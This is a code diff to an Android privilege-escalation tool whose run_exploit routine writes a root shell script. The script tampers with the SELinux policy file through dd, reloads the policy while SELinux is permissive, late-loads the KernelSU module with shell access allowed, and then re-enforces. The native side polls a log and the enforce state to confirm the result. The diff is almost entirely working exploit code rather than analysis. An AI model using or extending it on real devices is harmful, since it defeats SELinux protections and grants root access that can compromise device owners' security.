@@ -557,10 +557,7 @@ static void write_root_script(void) {
       "if [ \"$(id -u)\" -ne 0 ]; then\n"
       "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
       "  exit 1\n"
-       "fi\n"
-       "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
-       "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
-       "fi\n"
+      "fi\n"
       "KVER=$(uname -r | cut -d. -f1-2)\n"
       "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
       "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
@@ -600,7 +597,12 @@ static void write_root_script(void) {
       "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\") || return 1\n"
       "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
       "}\n"
+      "KSU_ALREADY=0\n"
+      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+      "  KSU_ALREADY=1\n"
+      "fi\n"
       "FIXUP_RC=1\n"
+      "# a reload unlabels running processes, init exits 127 on the stale SID\n"
       "for i in $(seq 1 10); do\n"
       "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
       "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
@@ -621,39 +623,38 @@ static void write_root_script(void) {
       "done\n"
       "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
       "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
-      "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
-      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
-      "  KSU_ALREADY=1\n"
-      "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
+      "# load_policy ok: late-load only when the module is not in the tree yet\n"
+      "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
+      "  echo '[+] kernelsu already loaded; no late-load' >>\"$LOG\"\n"
       "else\n"
-      "  KSU_ALREADY=0\n"
       "  if [ ! -x \"$KSUD\" ]; then\n"
       "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
       "    exit 1\n"
       "  fi\n"
-      "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
+      "  echo \"[*] late-load kmi=$KMI as uid=$(id -u)\" >>\"$LOG\"\n"
       "  chmod 755 \"$KSUD\" 2>/dev/null\n"
       "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
       "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
+      "  KSU_READY=0\n"
+      "  for i in $(seq 1 50); do\n"
+      "    if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
+      "    sleep 0.1\n"
+      "  done\n"
+      "  if [ \"$KSU_READY\" -ne 1 ]; then\n"
+      "    echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
+      "    exit 1\n"
+      "  fi\n"
+      "  echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
       "fi\n"
-      "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
-      "KSU_READY=0\n"
-      "for i in $(seq 1 50); do\n"
-      "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
-      "  sleep 0.1\n"
-      "done\n"
-      "if [ \"$KSU_READY\" -ne 1 ]; then\n"
-      "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
-      "  exit 1\n"
-      "fi\n"
-      "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
-      "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
-      "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
+      "# enforcing puts the app dir out of reach, so the native side reads\n"
+      "# the outcome\n"
+      "if [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" != \"1\" ]; then\n"
       "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
       "fi\n"
       "else\n"
       "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
-      "fi\n",
+      "fi\n"
+      "exit 0\n",
       g_home_dir, g_ksu_log_path);
   if (n < 0 || n >= (int)sizeof(script)) {
     pr_warning("root script too long\n");
@@ -1298,40 +1299,30 @@ int run_exploit(int argc, char **argv) {
    * the app-readable log for the loaded-module line (up to ~30s). */
   int ksu_log_loaded = 0;
   int ksu_log_failed = 0;
-  for (int i = 0; i < 60 && !(ksu_log_loaded || ksu_log_failed); i++) {
+  for (int i = 0; i < 60 && !ksu_log_failed && !ksu_log_loaded; i++) {
     FILE *lf = fopen(g_ksu_log_path, "r");
     if (lf) {
       char line[256];
       while (fgets(line, sizeof(line), lf)) {
         if (strstr(line, "[+] KernelSU module loaded") ||
-            strstr(line, "[+] KernelSU already loaded"))
+            strstr(line, "[+] kernelsu already loaded"))
           ksu_log_loaded = 1;
         if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
       }
       fclose(lf);
     }
-    if (!(ksu_log_loaded || ksu_log_failed)) usleep(500000);
+    if (!ksu_log_failed && !ksu_log_loaded) usleep(500000);
   }
-  /* Module init re-enforces at the very end of kernelsu_init; wait up to
-   * 20s for it. Denied read or value 1 both mean enforcing here. */
-  int enforce_ok = 0;
-  for (int i = 0; ksu_log_loaded && !enforce_ok && i < 200; i++) {
-    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
-    if (efd < 0) {
-      enforce_ok = 1;
-      break;
-    }
-    char eb[4] = {0};
-    ssize_t rn = read(efd, eb, sizeof(eb));
-    close(efd);
-    if (rn > 0 && eb[0] == '1') enforce_ok = 1;
-    if (!enforce_ok) usleep(100000);
-  }
-  if (enforce_ok)
-    pr_info("enforce=1 (enforcing)\n");
-  else if (ksu_log_loaded)
-    pr_warning("enforce=0 (still permissive)\n");
   kernelsu_ready = kernelsu_ready || ksu_log_loaded;
+  /* enforcing takes the app dir away from the root script, so its log stops
+   * before the restore. read the state here instead. */
+  int enforced = 0;
+  for (int i = 0; i < 20 && !(enforced = !check_selinux_off()); i++)
+    usleep(500000);
+  if (enforced)
+    pr_success("enforcing restored\n");
+  else
+    pr_warning("SELinux left permissive\n");
 
   /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
    * policy reload keeps it working after enforcing is back. */
